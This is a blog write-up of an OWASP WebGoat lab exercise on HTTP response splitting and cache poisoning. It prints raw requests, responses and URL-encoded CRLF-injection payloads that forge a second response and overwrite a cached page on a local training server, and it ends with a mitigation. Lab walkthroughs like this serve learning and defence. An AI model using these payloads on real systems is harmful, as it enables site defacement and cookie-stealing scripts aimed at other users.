---
layout: post
title:  "OWASP BWA WebGoat Challenge Part 1"
date:   2017-01-24 00:01:00 -0500
categories: webgoat
---
# HTTP Response Splitting
HTTP Response splitting is an attack that can be performed on a webserver that does not properly implement sanitization of user input on webpage forms. The specific exploitation that can be performed involves the use of carriage returns (%0a in HTML) and linefeeds (%0d in HTML). 

Normally, form entry is passed in a webpage's (client control) request to the webserver. The form fields are then appended onto the request header like so:

```
GET http://website.com/form_page?form1=field1&form2=field2 HTTP/1.1
<Rest of the request>
```

So, we can control part of the request with header data that we enter into our forms. This might not seem immediately malicious, but let's take a look at the WebGoat example:

```
POST /WebGoat/lessons/General/redirect.jsp?Screen=3&menu=100 HTTP/1.1
Host: 192.168.56.101
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:50.0) Gecko/20100101 Firefox/50.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Referer: http://192.168.56.101/WebGoat/attack?Screen=3&menu=100&language=test
Cookie: JSESSIONID=30084DBD49F5F0CA28D74331EC271DB8; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada
Authorization: Basic dXNlcjp1c2Vy
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

language=test&SUBMIT=Search%21
```

So in our form we simply entered "test". The POST request URL looks like we are going to be redirected to another resource on the webserver. Let's look at the server response and see what the next step is going to be:

```
HTTP/1.1 302 Moved Temporarily
Date: Tue, 24 Jan 2017 02:35:59 GMT
Server: Apache-Coyote/1.1
Location: http://192.168.56.101/WebGoat/attack?Screen=3&menu=100&fromRedirect=yes&language=test
Content-Type: text/html;charset=ISO-8859-1
Content-Length: 0
Via: 1.1 127.0.1.1
Vary: Accept-Encoding
Connection: close
```

Alright, so we are being redirected to the location specified by the 'Location' header in the response. Or more clearly:

```
Location: http://192.168.56.101/WebGoat/attack?Screen=3&menu=100&fromRedirect=yes&language=test
```

Aha! One thing should pop out at us here, and that is the fact that our form input ("test") is found sitting right at the end of the Location header. Now while this request takes us to the page intended by the server, we can manipulate this behaviour by abusing the response parsing mechanism, or the webcache.

The webcache sits between the user and the webapplication, parsing responses from the webapplication to hand back to users. The exploit that we are abusing lies in tricking the webcache to hand back two responses from a single request. If we are allowed to insert newline characters(%0a on Linux, %0a%0d on Windows) into our request, when the webcache handles the redirect response we can trick it into thinking that there should be two responses by truncating the original response and adding another completely attacker-controlled response to the webcache.

An example form exploit input could be like so (%20 is a URL-encoded space):

```
test%0aContent-Length:%200%0a%0aHTTP/1.1%20200%20OK%0aContent-Type:%20text/html%0aContent-Length:%2017%0a<html>pwnd</html>
```

The first section truncates the original intended response by specifying a false Content-Length header. URL-decoded, the redirect response now looks like so:

```
HTTP/1.1 302 Moved Temporarily
Date: Tue, 24 Jan 2017 02:35:59 GMT
Server: Apache-Coyote/1.1
Location: http://192.168.56.101/WebGoat/attack?Screen=3&menu=100&fromRedirect=yes&language=test
Content-Length: 0
```

The response is considered complete at this point. However, we have appended some extra data, that URL-decoded looks like so:

```
HTTP/1.1 200 OK
Content-Type:text/html
Content-Length: 17
<html>pwnd</html>
```

Now, the webcache only saw one request sent to the webserver by us (the attacker). Therefore our redirect is handled normally and we are served the cached response, which is the redirect to the location specified in the Location header. However, there is another response that was created from our first request. Using this response combined with some knowledge of how the webcache and webserver interact, we can craft an attack that could affect any other users of the resource.

# Cache Poisoning
So we have previously shown that we can split a single request into two separate responses, the second of which is completely attacker controlled. Now we can manipulate a mechanism that the webserver and webcache use for serving content in order to expose our crafted response to the maximum number of target users of the website.

Remember that in our first HTTP splitting example, the truncated response for the redirect resource was matched to our intial request. This left our payload response "on the wire" so to speak, as there was not a matching request for this resource. In a naive attack, the next request for a resource would be matched to our payload response and the payload would be served to whoever sent that request. However, we want to maximize the impact of our attack. Enter caching.

Caching is a way that the webserver serves the most up-to-date version of a resource to users of the site. Any requests that are sent for a resource on a webserver are served the cached version of the resource. Using HTTP splitting, we can perform a "cache poisoning" attack, in which we replace the expected cache of a resource with our malicious version. This is done by adding a "Last-Modified" header to the forged request with a date in the future.

So, now our attack looks like this:

```
test%0aContent-Length:%200%0a%0aHTTP/1.1%20200%20OK%0aLast-Modified:%20Fri,%2020%20Jan%202018%2013:35:00%20EST%0aContent-Type:%20text/html%0aContent-Length:%2017%0a<html>pwnd</html>
```

which translates to the following responses:

```
HTTP/1.1 302 Moved Temporarily
Date: Tue, 24 Jan 2017 02:35:59 GMT
Server: Apache-Coyote/1.1
Location: http://192.168.56.101/WebGoat/attack?Screen=3&menu=100&fromRedirect=yes&language=test
Content-Length: 0

HTTP/1.1 200 OK
Last-Modified: Fri, 20 Jan 2018 13:35:00 EST
Content-Type:text/html
Content-Length: 17
<html>pwnd</html>
```

Now during this attack we send two requests. The first request is our malicious form, and the second request is for the webserver resource that we would like to replace with our malicious response, like so:

Request 1:

```
POST /WebGoat/lessons/General/redirect.jsp?Screen=3&menu=100 HTTP/1.1
Host: 192.168.56.101
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:50.0) Gecko/20100101 Firefox/50.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Referer: http://192.168.56.101/WebGoat/attack?Screen=3&menu=100&fromRedirect=yes&language=foobar%0aContent-Length:%2043%0a%3Chtml%3E123456789012345678901234567890%3C/html%3E
Cookie: JSESSIONID=30084DBD49F5F0CA28D74331EC271DB8; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada
Authorization: Basic dXNlcjp1c2Vy
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 271

language=test%250aContent-Length%3A%25200%250a%250aHTTP%2F1.1%2520200%2520OK%250aLast-Modified%3A%2520Fri%2C%252020%2520Jan%25202018%252013%3A35%3A00%2520EST%250aContent-Type%3A%2520text%2Fhtml%250aContent-Length%3A%252017%250a%3Chtml%3Epwnd%3C%2Fhtml%3E&SUBMIT=Search%21
```

Request 2:

```
GET /WebGoat/index.html HTTP/1.1
Host: 192.168.56.101
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:50.0) Gecko/20100101 Firefox/50.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
```

When we send the malicious request, it is matched to the original redirect response. Now we have another response waiting to match with a request. Now our second request is received and matched with our malicious response. The webcache sees that the "Last-Modified" header is present in the response, and the date is more recent than the existing cached version, so it replaces the cache for the requested resource ("index.hmtl") with the malicious response ("<html>pwnd</html>").

<img src="{{ site.baseurl }}/images/2017-01-24-webgoat_part_1/part1pwnd.jpg">

This can be much more serious than a simple defacement like we performed here. Alternatively, an attacker could append JavaScript to perform cross-site scripting attacks to steal cookies or other sensitive user data. In order to prevent this attack, any user-controlled data that can end up in a request header needs to be sanitized to prevent insertion of carriage-return and linefeed characters.

### Resources

1 [HTTP Response Splitting Whitepaper][http-splitting-whitepaper]

2 [OWASP HTTP Response Splitting][owasp-splitting]

[http-splitting-whitepaper]:https://dl.packetstormsecurity.net/papers/general/whitepaper_httpresponse.pdf
[owasp-splitting]:https://www.owasp.org/index.php/HTTP_Response_Splitting